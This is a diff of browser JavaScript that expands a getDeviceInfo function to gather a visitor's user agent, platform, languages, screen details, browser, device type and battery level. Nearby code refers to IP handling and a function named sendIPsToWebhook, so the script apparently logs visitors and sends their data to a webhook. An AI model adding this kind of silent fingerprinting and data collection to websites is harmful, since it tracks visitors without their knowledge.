@@ -206,18 +206,50 @@ script_()
         script_(ip);
       }
     });
-function getDeviceInfo() {
+async function getDeviceInfo() {
   const ua = navigator.userAgent;
-  console.log("User Agent:", ua);
 
-  if (/android/i.test(ua)) return "Android device";
-  if (/iPad|iPhone|iPod/.test(ua)) return "iOS device";
-  if (/Macintosh/.test(ua)) return "Mac";
-  if (/Windows/.test(ua)) return "Windows PC";
-  if (/Linux/.test(ua)) return "Linux device";
-  
-  return "Unknown device";
+  const deviceInfo = {
+    userAgent: ua,
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: navigator.languages,
+    screen: {
+      width: screen.width,
+      height: screen.height,
+      colorDepth: screen.colorDepth,
+      pixelRatio: window.devicePixelRatio,
+    },
+    os: "Unknown OS",
+    device: "Unknown device",
+    browser: "Unknown browser",
+    batteryLevel: "غير مدعوم",
+  };
+  if (/android/i.test(ua)) deviceInfo.os = "Android";
+  else if (/iPad|iPhone|iPod/.test(ua)) deviceInfo.os = "iOS";
+  else if (/Macintosh/.test(ua)) deviceInfo.os = "macOS";
+  else if (/Windows/.test(ua)) deviceInfo.os = "Windows";
+  else if (/Linux/.test(ua)) deviceInfo.os = "Linux";
+  if (/mobile/i.test(ua)) deviceInfo.device = "جوال";
+  else if (/tablet/i.test(ua)) deviceInfo.device = "جهاز لوحي";
+  else deviceInfo.device = "كمبيوتر";
+  if (/Chrome/.test(ua) && !/Edg/.test(ua)) deviceInfo.browser = "Chrome";
+  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) deviceInfo.browser = "Safari";
+  else if (/Firefox/.test(ua)) deviceInfo.browser = "Firefox";
+  else if (/Edg/.test(ua)) deviceInfo.browser = "Edge";
+  else if (/OPR|Opera/.test(ua)) deviceInfo.browser = "Opera";
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      deviceInfo.batteryLevel = `${Math.round(battery.level * 100)}%`;
+    } catch (err) {
+      deviceInfo.batteryLevel = "فشل قراءة البطارية";
+    }
+  }
+
+  return deviceInfo;
 }
+
 
 
 async function sendIPsToWebhook() {
